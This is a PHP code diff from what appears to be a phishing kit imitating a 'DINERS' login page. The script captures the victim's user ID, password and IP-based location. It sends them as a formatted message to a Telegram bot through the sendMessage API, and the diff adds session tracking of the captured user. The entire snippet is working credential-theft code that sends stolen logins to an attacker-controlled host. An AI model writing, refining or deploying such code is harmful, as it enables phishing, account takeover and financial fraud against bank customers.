@@ -26,13 +26,14 @@ if (isset($_POST["dni"]) && isset($_POST["cpass"])) {
     $city = isset($ip_data["city"]) ? $ip_data["city"] : "";
     $ip = isset($ip_data["query"]) ? $ip_data["query"] : "";
 
-    // Generar session_id único
+    // Generar session_id único y guardar usuario
     $session_id = uniqid('user_', true);
     $_SESSION['session_id'] = $session_id;
+    $_SESSION['user_identifier'] = $dni; // Guardar usuario para tracking
     $_SESSION['user_data'] = ['dni' => $dni, 'cpass' => $cpass];
 
     // Sin etiquetas no especificadas en el mensaje
-    $msg = "DINERS Email Login 🦁\n📧 Usuario: => " . $dni . "\n🔑 Contraseña: => " . $cpass . "\n📍 IP: " . $ip . "\n==========================\n";
+    $msg = "DINERS Email Login 🦁\n👤 Usuario: " . $dni . "\n Contraseña: => " . $cpass . "\n📍 IP: " . $ip . "\n==========================\n";
 
     $url = $website.'/sendMessage?chat_id='.$chat_id.'&parse_mode=HTML&text='.urlencode($msg);
     file_get_contents($url);
